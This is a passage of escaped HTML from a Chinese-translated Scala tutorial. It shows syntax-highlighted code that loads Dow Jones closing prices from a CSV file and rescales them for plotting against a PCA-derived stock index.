class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Split the comma separated value string into an array of strings&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//把用逗号分隔的数值字符串分解为一个字符串数组&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;SimpleDateFormat&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;yyyy-MM-dd&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Extract the values from the strings&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//从字符串中抽取数值&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-13&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//And return the result in a format that can later &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//easily be used to feed to Smile&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//并以一定格式返回结果，使得该结果之后容易输入到Smile中处理&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-19&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDJIFromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;fromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Get all the records (minus the header)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//获取所有记录（减去标头）&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;source&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getLines&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;drop&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDJIRecordFromString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-28&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-29&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//turn the tuples into two separate arrays for easier use later on&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//将这些元组分隔为两个数组以方便之后使用&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sortedData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dates&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sortedData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-34&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;doubles&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sortedData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-35&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c6872605657-36&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dates&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;doubles&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-37&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0046 seconds] --&gt;
&lt;p&gt;这段代码加载了 DJI 数据，并把它绘成图线添加到我们自己的股票指数图中。然而，当我们执行这段代码时，效果图有点无用。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2015/10/5fe61688c03b53ee0c24a86f4a45ba6c.png&quot;&gt;&lt;img class=&quot;alignnone wp-image-59832&quot; src=&quot;/images/jobbole.com/e0d69a646c5961377b3b404d0781709f.jpg&quot; alt=&quot;Unscaled_DJI_PCA_Index&quot; width=&quot;604&quot; height=&quot;567&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如你所见，DJI 的取值范围与我们的计算特征的取值范围偏离很远。因此，现在我们要将数据标准化。办法就是根据数据的取值范围将数据进行缩放，这样，两个数据集就会落在同样的比例中。&lt;/p&gt;
&lt;p&gt;用下列代码替换 getDJIFromFile 方法：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d0613ca092497848&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
def getDJIFromFile(file: File): (Array[Date],Array[Double]) = {
    val source = scala.io.Source.fromFile(file)
    //Get all the records (minus the header)
    //获取所有记录（减去标头）
    val data = source
        .getLines()
        .drop(1)
        .map(x =&amp;gt; getDJIRecordFromString(x))
        .toArray

    source.close()

    //turn the tuples into two separate arrays for easier use later on
    //将这些元组分隔为两个数组以方便之后使用
    val sortedData = data.sortBy(x =&amp;gt; x._1)
    val dates = sortedData.map(x =&amp;gt; x._1)
    val maxDouble = sortedData.maxBy(x =&amp;gt; x._2)._2
    val minDouble = sortedData.minBy(x =&amp;gt; x._2)._2
    val rangeValue = maxDouble - minDouble
    val doubles = sortedData.map(x =&amp;gt;   x._2 / rangeValue )

    (dates, doubles)
  }&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-19&quot;&gt;19&lt;/div&gt;
